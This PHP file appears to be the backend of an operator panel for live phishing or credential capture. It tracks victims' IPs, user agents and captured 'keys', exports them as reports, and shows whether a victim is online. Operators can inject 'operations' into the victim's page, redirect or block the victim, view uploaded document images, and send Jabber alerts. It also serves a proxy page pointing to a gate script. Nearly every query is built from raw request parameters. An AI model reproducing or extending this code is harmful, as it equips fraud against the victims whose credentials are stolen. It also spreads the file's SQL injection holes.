<?php
if (!defined('UADMIN_AB_ROOT')) {die("You not have permisions");}

//############## PHP vars #####################
//############## PHP vars #####################

$sql = new sqlite3($k_plugin->path . 'public/.ht.db');
$sql->busyTimeout(5000); // prevetn form locking/// very importante
$dat = date("Y-m-d H:i:s");


if(isset($_GET['ajax'])){





        header('Content-Type: application/json');



       




        // header('Content-Type: text/html');
        $time = time();
        // $sql  = new sqlite3('../public/.ht.db');
        // $sql->busyTimeout(5000); // prevetn form locking/// very importante
        
        $q                  = "select rowid as DT_RowId,* from main ";
        $r                  = $sql->query($q);
        $dataTableRes       = new stdClass();
        $dataTableRes->data = array();



        // filter


        $links=$k_user->links_filter;
       
        

        //


        while ($row = $r->fetchArray(SQLITE3_ASSOC)) {
        
            if(in_array($row['link'],$links) || (sizeof($links)==1 && $links[0]=="*") ) {
               
                    unset($row['l']);
                    unset($row['op']);
                    unset($row['bc_method']);
                    unset($row['whatever']);
                    $row['la'] = detect_online2($row['la']);
                    $dataTableRes->data[] = $row;
            }
        
        }


// echo "<pre>";


        echo json_encode($dataTableRes);
        exit;



}


function detect_online2($val)
{
    $time = time();

    // if($time>($val+20)){return "0";}else{return "1";};
    // return 5;
    return $time - $val;

}




if (isset($_GET['text'])) {

    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="report.txt"');
    $items    = 0;
    $text_arr = json_decode($_GET['data']);

    $arr = implode("','", $text_arr);

    $qstr = "select * from main where ui in ('" . $arr . "')";

    $res = $sql->query($qstr);
    $out = '';
    while ($r = $res->fetchArray()) {
        $out .= "| " . $r['ip'] . " | " . $r['link'] . " |\n";
        $log = preg_replace("/\<br\>/", "\n  ", $r['key']);
        $out .= $log . "\n\n";
    }
    ;
    print($out);

    exit;
}

if (isset($_GET['ui'])) {
    $ui = $_GET['ui'];
}

$res   = $sql->query("select link from main");
$links = array();

while ($link = $res->fetchArray(SQLITE3_ASSOC)) {
    $link['show'] = true;
    $links[]      = $link;
}

// $links=array_unique($links);

$php_js->links = $links;

//########################

if (isset($_GET['get_sys'])) {
    header('Content-Type: text/javascript');
    $res          = $sql->query("select * from sys");
    $res          = $res->fetchArray();
    $respond      = new stdClass();
    $respond->sys = $res;
    echo json_encode($respond);
    exit;
}

if (isset($_GET['comand'])) {

    header('Content-Type: text/javascript');

    if (isset($_GET['reg'])) {

        ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));

        $st  = $_GET['reg'];
        $res = $sql->exec("update sys set reg='$st'");
        if (!$res) {echo "error";} else {echo __("Updated");}
        ;
    }
    ;

    if (isset($_GET['re_all'])) {
        ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
        $st = $_GET['re_all'];

        $res = $sql->exec("update sys set re_all='$st'");
        if (!$res) {echo "error";} else {echo __("Updated");}
        ;
    }
    ;

    if (isset($_GET['re_update'])) {
        ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
        $ui = $_GET['re_update'];
        $st = $_GET['newvalue'];
        if ($st == "1") {$res = $sql->exec("update main set re='$st',w=0 where rowid='$ui'");} else { $res = $sql->exec("update main set re='$st' where rowid='$ui'");}
        if (!$res) {echo "error";} else {echo __("Updated");}
        ;
    }
    ;

    if (isset($_GET['bl_update'])) {
        ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
        $ui  = $_GET['bl_update'];
        $st  = $_GET['newvalue'];
        $res = $sql->exec("update main set bl='$st' where rowid='$ui'");
        if (!$res) {echo "error";} else {echo __("Updated");}
        ;
    }
    ;

    if (isset($_GET['del'])) {
        ACTION::actions_filter(json_decode('{"id":"token_del","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Delete logs on Token Plugin"}'));
        $row_id = $_GET['del'];
        $res    = $sql->exec("delete from main where rowid='$row_id'");
        if (!$res) {echo "error";} else {echo __("Updated");}
        $sql->exec("vacuum");
        ;
    }
    ;

    if (isset($_GET['del_all'])) {
        ACTION::actions_filter(json_decode('{"id":"token_del","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Delete logs on Token Plugin"}'));
        $res = $sql->exec("delete from main");
        if (!$res) {echo "error";} else {echo __("Updated");}
        $sql->exec("vacuum");

    }

    if (isset($_GET['comm_update'])) {
        $row_id = $_GET['comm_update'];
        $comm   = esc__($_GET['comm']);

        echo $comm;

        $res = $sql->exec("update main set comm='$comm' where rowid='$row_id'");
        if (!$res) {echo "error";} else {echo __("Updated");}

    }

    if (isset($_GET['del_multy'])) {
        ACTION::actions_filter(json_decode('{"id":"token_del","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Delete logs on Token Plugin"}'));
        $del_arr = json_decode($_GET['del_multy']);
        $qstr    = "delete from main where rowid in ( ";
        foreach ($del_arr as $num) {
            $qstr .= $num . ",";
        }
        ;
        $qstr = preg_replace('/,$/', '', $qstr);
        $qstr .= ')';
        $res = $sql->exec($qstr);
        if (!$res) {echo "error";} else {echo __("Updated");}
        $sql->exec("vacuum");
        ;
    }
    ;

    $sql->close();
    unset($sql);
    exit;
}

//################# PANEL querys##################
//################# PANEL querys##################

if (isset($_GET['comm_update'])) {
    $row_id = $_GET['comm_update'];
    $comm   = esc__($_GET['comm']);
    $res    = $sql->exec("update main set comm='$comm' where rowid='$row_id'");
    if (!$res) {echo "error";} else {echo __("Updated");}
    ;

    $sql->close();
    unset($sql);
    exit;
}

if (isset($_GET['re_update'])) {
    ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
    $ui = $_GET['re_update'];
    $st = $_GET['newvalue'];
    if ($st == "1") {$res = $sql->exec("update main set re='$st',w=0 where rowid='$ui'");} else { $res = $sql->exec("update main set re='$st' where rowid='$ui'");}
    if (!$res) {echo "error";} else {echo __("Updated");}
    ;

    $sql->close();
    unset($sql);
    exit;
}

if (isset($_GET['bl_update'])) {
    ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
    $ui  = $_GET['bl_update'];
    $st  = $_GET['newvalue'];
    $res = $sql->exec("update main set bl='$st' where rowid='$ui'");
    if (!$res) {echo "error";} else {echo __("Updated");}
    ;

    $sql->close();
    unset($sql);
    exit;
}

if (isset($_GET['add_op'])) {
    ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
    header('Content-Type: application/json');
    $respond = new stdClass();
    $op_obj  = $_GET['data'];
    $obj     = json_decode($op_obj);




    $obj->sql_ms = $dat . '&nbsp;&nbsp;-&nbsp;&nbsp;' . $obj->sql_ms;

    $obj_to_send = clone $obj;



    //remove unwanted iem for json to be send to inejct
    unset($obj_to_send->als);
    unset($obj_to_send->title);
    unset($obj_to_send->sql_ms);
    unset($obj_to_send->desc);
    unset($obj_to_send->button);
    unset($obj_to_send->inputs);

    if (isset($obj->cn)) {

        $obj_to_send->cn = str_replace("'", "`", $obj_to_send->cn);
    }

    foreach ($obj_to_send as $key => $val) {
        $obj_to_send->{$key} = (str_replace("'", "`", $obj_to_send->{$key}));
    }
    ;

   

    $obj_to_send = json_encode($obj_to_send,JSON_UNESCAPED_UNICODE);//2020
    // $obj_to_send = utf8_encode($obj_to_send);
    // $obj_to_send = json_decode($obj_to_send);





   

    $res = $sql->exec("update main set op='$obj_to_send' , l='$obj->sql_ms'||'\n'||l where rowid='$ui'");
    if (!$res) {
        $respond->mes = "Error on " . __LINE__;
    } else {
        $respond->mes = $obj->sql_ms;
    }
    ;

    echo json_encode($respond);

    $sql->close();
    unset($sql);
    exit;
}

if (isset($_GET['set_redirect'])) {
    ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
    header('Content-Type: application/json');
    $respond = new stdClass();
    $re_obj  = $_GET['data'];
    $obj     = json_decode($re_obj);

    $new_val = (int) $obj->redirect;

    $obj->sql_ms = $dat . '&nbsp;&nbsp;-&nbsp;&nbsp;' . $obj->sql_ms;

    $res = $sql->exec("update main set re='$new_val' ,w=0, l='$obj->sql_ms'||'\n'||l where rowid='$ui'");
    if (!$res) {
        $respond->mes = "Error on " . __LINE__;
    } else {
        $respond->mes = $obj->sql_ms;
    }
    ;

    echo json_encode($respond);

    $sql->close();
    unset($sql);
    exit;
}

if (isset($_GET['set_block'])) {
    ACTION::actions_filter(json_decode('{"id":"token_add_op","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Add Operations on Token Plugin"}'));
    header('Content-Type: application/json');
    $respond     = new stdClass();
    $re_obj      = $_GET['data'];
    $obj         = json_decode($re_obj);
    $new_val     = (int) $obj->block;
    $obj->sql_ms = $dat . '&nbsp;&nbsp;-&nbsp;&nbsp;' . $obj->sql_ms;

    $res = $sql->exec("update main set bl='$new_val' ,l='$obj->sql_ms'||'\n'||l where rowid='$ui'");
    if (!$res) {
        $respond->mes = "Error on " . __LINE__;
    } else {
        $respond->mes = $obj->sql_ms;
    }
    ;

    echo json_encode($respond);

    $sql->close();
    unset($sql);
    exit;
}

if (isset($_GET['clear_logs'])) {

    $res = $sql->exec("update main set l=''  where rowid='$ui'");
    if (!$res) {echo "error";} else {echo __("Updated");}
    ;
    $sql->close();
    unset($sql);
    exit;
}

if (isset($_GET['link_ops'])) {

    ACTION::actions_filter(json_decode('{"id":"token_link_op_update","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Update Links cfg on Token Plugin"}'));

    header('Content-Type: application/json');
    $link        = $_GET['link'];
    $opts        = isset($_GET['opts']) ? $_GET['opts'] : array();
    $opt_encoded = json_encode($opts);
    $size        = $sql->query("select count(*) as size from opt where link='$link'")->fetchArray();
    if ($size['size'] > 0) {
        $res = $sql->exec("update opt set opt='$opt_encoded' where link='$link'");
    } else {
        //make new one
        $res = $sql->exec("insert into opt (link,opt) values('$link','$opt_encoded')");
    }
    echo '{"res":"Operations Updated"}';
    exit;
}

// ############Jabbrs#################

if (isset($_GET['test_jabs'])) {
    header('Content-Type: application/json');
    // ACTION::actions_filter(json_decode('{"id":"token_link_op_update","err_mes":"Sorry, you can not perform this operation. Contact admin","desc":"Update Links cfg on Token Plugin"}'));

    $jabber_pl = array_values(array_filter($plugins, function ($item) {
        return $item->id == "jabber";
    }));
    $jabs = $_GET['jabs'];

    if (!empty($jabber_pl)) {

        require_once $jabber_pl[0]->path . 'jabberHelper.php';
        if (function_exists('send_jabber')) {
            send_jabber('test', $jabs);
        }

    } else {
        echo "Jabber plugin missing";
    }

    echo '{"res":"Test message sent"}';
    exit;
}

if (isset($_GET['save_jabs'])) {
    header('Content-Type: application/json');
    ACTION::actions_filter(json_decode('{"id":"token_update_jabs","err_mes":"Sorry, you can not perform this operation. Contact admin","desc":"Update Jabber setting on  Token Plugin"}'));

    $jabs   = isset($_GET['jabs']) ? json_encode($_GET['jabs']) : '[]';
    $sendon = isset($_GET['sendon']) ? json_encode($_GET['sendon']) : '[]';
    $link   = $_GET['link'];

    $res = $sql->exec("update opt set sendon='$sendon' , jabs='$jabs' where link='$link'");

    echo '{"res":"Setting saved"}';
    exit;
}

// ############Jabbrs#################

//#########################################

if (isset($_GET['proxy'])) {

    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="home.php"');

    $proxy_content = file_get_contents(dirname(__file__) . '/proxy_template/proxy.php');

    $proxy_content = str_replace("{{real_home}}", UADMIN_ROOT_DIR_URL . "gate.php", $proxy_content);

    $out = $proxy_content;
    print($out);

    exit;
}
;

//##########################################

//########## DYNAMIC ###############################################
//########## DYNAMIC ###############################################

function detect_online($val)
{
    $time = time();
    if ($time > ($val + 20)) {return false;} else {return true;}
    ;
}

if (isset($_GET['get_dynamic'])) {
    header('Content-Type: application/json');



    $respond = new stdClass();
    $time    = time();

    $res = $sql->exec("update main set operator='$k_user->ui', operator_last_connect='$time' where rowid='$ui'");

    $res = $sql->query("select * from main where rowid='$ui' limit 1");
    $res = $res->fetchArray();

    $respond->visitor_online = detect_online($res['la']);
    $respond->visitor_wating = $res['w'];
    $respond->keys           = $res['key'];
    $respond->ip             = $res['ip'];
    $respond->link           = $res['link'];
    $respond->lc             = $res['la'];
    $respond->ua             = $res['ua'];
    $respond->comm           = $res['comm'];
    $respond->logs           = $res['l'];
    $respond->bl             = $res['bl'];
    $respond->re             = $res['re'];
    $respond->chat           = $res['chat'];
    $respond->ui             = $res['ui'];

    if (!$respond->visitor_online) {
        $respond->visitor_wating = 0;
    }






// 2019


    $logs_plugin = CUSTOM_PLUGIN::get_plugin_by_ui('logs');

    if ($logs_plugin != false) {
        $files = array();

        if (file_exists($logs_plugin->path . 'public/docs/' . $respond->ui)) {
            $this_log_path = $logs_plugin->path . 'public/docs/' . $respond->ui . '/';
            $docs          = glob($this_log_path . '*.{jpg,png,gif,jpeg,JPG,PNG,GIF,JPEG}', GLOB_BRACE);

            $docs = array_map(function ($doc) {
                global $logs_plugin;
                return $logs_plugin->url_ . 'public/docs/' . basename(dirname($doc)) . '/' . basename($doc);
            }, $docs);
            $files = $docs;
            //  print_r($docs);
        }


         $respond->files=$files; 
    }



// 2019






    echo json_encode($respond);

    $sql->close();
    unset($sql);
    exit;

}

//########## DYNAMIC ###############################################
//########## DYNAMIC ###############################################

if (isset($_GET['save_pattern'])) {
    header('Content-Type: application/json');

    $link    = $_GET['link'];
    $pattern = $_GET['pattern'];

    $res = $sql->exec("update opt set pattern='$pattern' where link='$link'");

    echo '{"res":"Pattern saved"}';

    $sql->close();
    unset($sql);
    exit;

}
